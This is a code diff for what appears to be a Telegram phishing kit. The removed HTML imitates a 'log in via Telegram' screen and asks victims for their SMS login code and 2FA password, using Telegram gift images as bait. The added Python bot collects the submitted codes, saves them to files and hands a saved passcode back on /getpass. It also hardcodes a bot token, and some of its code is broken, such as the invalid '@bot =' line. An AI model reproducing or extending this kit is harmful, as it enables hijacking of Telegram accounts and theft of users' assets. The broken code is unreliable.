@@ -1,94 +1,97 @@
-<!DOCTYPE html>
-<html lang="en">
+import os
+import telebot
+from flask import Flask, Blueprint, request, jsonify
+import json
+from telebot import types
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="stylesheet" href="loginScreenScripts.css">
-    <link rel="stylesheet" href="squares.css">
-    <link rel="stylesheet" href="popup.css">
-    <script src="https://telegram.org/js/telegram-web-app.js?59"></script>
-</head>
+TOKEN = "8506299686:AAGFB5pH2-NdU4aGQXKyi2FRfX_8r0y_Kts"
+WEBAPP_URL = "https://fairusss.github.io/tgbot/"
 
-<body>
-    <div class="area">
-        <div class="container">
-            <div id="page1">
-                <div id="bg">
-                    <img class="main-logo" src="assets/ico.svg" alt="">
-                    <h1 id="TEST">test 1.5</h1>
-                    <p>Для продолжения работы с ботом необходимо авторизоваться через <span style="color: #68ba4f; font-weight: bold; text-shadow: 0 0 0.5rem #59be4a;">Telegram</span></p>
-                    <button class="btn" id="loginbtn">
-                        <img src="assets/tg.svg" alt="">
-                        Войти через Telegram
-                    </button>
-                </div>
-            </div>
-            <div class="blur" id="blur"></div>
-            <div id="page2">
-                <img class="small-logo" src="assets/ico.svg" alt="">
-                <p class="passcode-title">Введите код из СМС</p>
-                <div class="code-box" id="codeBox">
-                    <div class="cell"></div>
-                    <div class="cell"></div>
-                    <div class="cell"></div>
-                    <div class="cell"></div>
-                    <div class="cell"></div>
-                </div>
-                <input id="hiddenInput" type="text" maxlength="5" inputmode="numeric" />
-                <button class="btn" id="passcode-btn" onclick="sendCodeToBot()">Подтвердить</button>
-                <div id="popup"></div>
-            </div>
-            <div id="page3">
-                <img class="small-logo" src="assets/ico.svg" alt="">
-                <h1 class="passcode-title">Введите пароль 2FA</h1>
-                <input type="text" placeholder="Пароль" id="twofactor-input">
-                <button class="btn" id="twofactor-btn">Подтвердить</button>
-                <div id="popup"></div>
-            </div>
-        </div>
+app = Flask(__name__)
 
-        <ul class="circles">
-            <img src="assets/33.svg" alt="">
-            <img src="assets/Ion Gem.svg" alt="">
-            <img src="assets/Plush Pepe.svg" alt="">
-            <img src="assets/Toy Bear.svg" alt="">
-            <img src="assets/Vintage Cigar.svg" alt="">
-            <img src="assets/Ionic Dryer.svg" alt="">
-            <img src="assets/Lush Bouquet.svg" alt="">
-            <img src="assets/18.svg" alt="">
-            <img src="assets/Witch Hat.svg" alt="">
-            <img src="assets/Precious Peach.svg" alt="">
-        </ul>
+path_cwd = os.path.dirname(os.path.realpath(__file__))
+path_templates = os.path.join(path_cwd, "templates")
+path_static = os.path.join(path_cwd, "static")
 
-    </div>
+Func = Blueprint('func', __name__, static_folder=path_static, template_folder=path_templates)
 
-    <script src="loginScreenScripts.js"></script>
 
-    <script>
-        let code = ''; // Переменная для хранения введённого кода
+@app.route('/')
+def index():
+    return "WebApp працює!"
 
-        // Обновление кода при вводе
-        function updateCode() {
-            code = document.getElementById('hiddenInput').value;
-        }
 
-        // Функция для отправки кода в Telegram (без закрытия WebApp)
-        function sendCodeToBot() {
-            if (code.length === 5) {
-                // Отправка данных в Telegram Web App
-                if (Telegram.WebApp) {
-                    Telegram.WebApp.sendData(code);  // Отправка данных через WebApp API
-                }
-            } else {
-                alert("Введите правильный код!");
-            }
-        }
+@bot = telebot.TeleBot(TOKEN)
 
-        // Добавим обработку ввода, чтобы обновить код при каждом вводе
-        document.getElementById('hiddenInput').addEventListener('input', updateCode);
-    </script>
 
-</body>
-</html>
+# /start — показує кнопку з WebApp
+@bot.message_handler(commands=['start'])
+def start(message):
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton(
+            text="Відкрити WebApp",
+            web_app=types.WebAppInfo(url=WEBAPP_URL)
+        )
+    )
+    bot.send_message(
+        message.chat.id,
+        "Привіт! Натисни, щоб відкрити Quest Market:",
+        reply_markup=markup
+    )
+
+
+# Обработчик получения данных из WebApp
+@bot.message_handler(content_types=['web_app_data'])
+def handle_webapp_data(message):
+    # Данные приходят через WebApp API
+    data = message.web_app_data
+    print(f"Received from WebApp: {data}")
+
+    # Отправка данных обратно в Telegram
+    bot.send_message(message.chat.id, f"Отримано дані: {data}")
+
+    # Сохраняем данные в файл (для теста)
+    with open("received_data.txt", "w") as f:
+        f.write(data)
+
+    bot.send_message(message.chat.id, f"Дані збережено: {data}")
+
+
+@app.route("/submit_data", methods=["POST"])
+def submit_data():
+    try:
+        data = request.get_json()
+        action = data.get("action")
+        value = data.get("value")
+        user_id = data.get("user_id")
+
+        print(f"Received from WebApp: {action} = {value}")
+
+        # Optionally send confirmation message to Telegram chat
+        if user_id:
+            bot.send_message(user_id, f"✅ Got {action}: {value}")
+
+        return jsonify(success=True, message="Data received"), 200
+    except Exception as e:
+        print("Error:", e)
+        return jsonify(success=False, message=str(e)), 400
+
+
+@bot.message_handler(commands=['getpass'])
+def get_pass(message):
+    try:
+        with open("temp_passcode.txt", "r") as f:
+            saved = f.read()
+        bot.send_message(message.chat.id, f"📄 Saved passcode: {saved}")
+    except FileNotFoundError:
+        bot.send_message(message.chat.id, "❌ No passcode saved yet.")
+
+
+print("Бот запущено! Очікуємо дані...")
+
+bot.infinity_polling()
+
+if __name__ == "__main__":
+    port = 12345
+    app.run(host="0.0.0.0", port=port)
